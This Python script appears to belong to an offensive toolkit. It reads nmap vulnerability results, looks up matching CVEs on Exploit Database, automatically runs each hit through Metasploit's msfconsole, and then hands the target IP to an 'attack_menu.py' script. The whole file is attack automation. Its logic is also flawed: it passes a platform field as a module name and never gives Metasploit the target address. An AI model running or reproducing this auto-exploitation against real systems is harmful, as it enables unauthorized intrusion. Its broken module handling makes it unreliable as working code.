import requests
import json
import subprocess
import re
import sys

# Retrieve the IP address from command-line argument
Ip = sys.argv[1]

# Load the database.json file
with open("database.json", "r") as file:
    data = json.load(file)

# Extract relevant scan results
nmap_scan_results = data.get("NMAP SCAN", {})

# Function to extract vulnerabilities from NMAP scan results within the specified year range
def extract_vulnerabilities(scan_results, start_year, end_year):
    vulnerabilities = []
    for port, info in scan_results.items():
        if "vulners" in info:
            for vulnerability in info["vulners"]:
                match = re.search(r"CVE-(\d{4})-\d+", vulnerability)
                if match:
                    year = int(match.group(1))
                    if start_year <= year <= end_year:
                        vulnerabilities.append(vulnerability)
    return vulnerabilities

# Extract vulnerabilities from NMAP scan within the specified year range (2019 to 2024)
nmap_vulnerabilities = extract_vulnerabilities(nmap_scan_results, 2019, 2024)

# Function to search for exploits on Exploit Database
def search_exploit_database(vulnerability):
    url = f"https://www.exploit-db.com/json/search/?q={vulnerability}"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise exception for HTTP errors
        data = response.json()
        exploits = [result["platform"] for result in data["results"]]
        return exploits
    except requests.RequestException as e:
        print(f"Error searching exploits for {vulnerability}: {e}")
        return []

# Function to run Metasploit exploit
def run_metasploit_exploit(exploit):
    # Execute the Metasploit command to run the exploit
    subprocess.run(["msfconsole", "-q", "-x", f"use {exploit}; run"])

# Iterate over vulnerabilities and attempt to exploit them
for vulnerability in nmap_vulnerabilities:
    print(f"Searching for exploits related to vulnerability: {vulnerability}")
    exploits = search_exploit_database(vulnerability)
    if exploits:
        print(f"Found {len(exploits)} exploit(s) for vulnerability {vulnerability}:")
        for exploit in exploits:
            # You would need to modify the exploit name to match the Metasploit module name
            print(exploit)
            run_metasploit_exploit(exploit)
    else:
        print(f"No exploits found for vulnerability {vulnerability}")

# Run attack menu script
subprocess.call(['python3', 'attack_menu.py', Ip])
